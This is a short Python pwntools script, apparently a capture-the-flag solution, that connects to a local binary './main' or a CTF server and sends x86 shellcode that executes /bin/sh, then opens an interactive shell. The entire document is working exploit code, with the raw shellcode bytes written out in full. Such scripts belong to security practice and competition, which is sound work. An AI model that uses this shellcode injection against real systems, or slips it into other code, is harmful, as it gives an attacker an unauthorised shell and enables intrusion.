from pwn import *
REMOTE = False
HOST = 'ctf.kuality.kr'
PORT = 20010

if REMOTE:
    io = remote(HOST, PORT)
else:
    io = process('./main')

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'
io.sendline(shellcode)
io.interactive()